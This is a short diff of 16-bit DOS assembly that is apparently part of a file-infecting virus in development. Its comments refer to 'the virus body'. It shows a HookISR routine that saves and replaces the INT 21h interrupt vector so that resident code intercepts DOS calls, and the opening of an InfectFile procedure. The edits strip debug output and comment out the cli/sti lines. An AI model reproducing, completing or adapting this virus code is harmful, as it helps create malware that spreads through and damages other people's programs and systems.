@@ -28,11 +28,9 @@ Printf ENDP
 ; Arguments: AL: Interrupt number , SI: Buffer in which to save old ISR address (DWORD) , DX: Address of new ISR
 ; Registers Destroyed: ax, bx, es
 HookISR PROC
-SaveRegisters
 lea si,newisr
 call Printf 
-RestoreRegisters
-cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared. 
+;cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared. 
 mov ah, 35h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
 int 21h ;Get Address of Old ISR  --> Call DOS  (Current interrupt handler returned in ES:BX)
 mov word ptr [si], bx ;Save it si+2 = segment and si = offset
@@ -40,11 +38,9 @@ mov word ptr [si+2], es
 ;lea dx, myint21h ; Load DX with the offset address of the start of this TSR program (the virus body) dx is a input
 mov ah, 25h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
 int 21h
-sti ;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
-SaveRegisters
+;sti ;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
 lea si,hookdone
-call Printf 
-RestoreRegisters 
+call Printf  
 ret
 HookISR ENDP
 ;----------------------------------------------------------------------------
@@ -55,11 +51,6 @@ HookISR ENDP
 ; Registers Destroyed: dx si ax ds ah bx cx 
 InfectFile PROC
 GetRelocation bp
-
-   ;for debuging..
-   mov dl,'I' ; print 'A'
-   mov ah,2h
-   int 21h
 lea si,[bp+sFileOpen]
 call Printf
 ;  OPEN FILE 
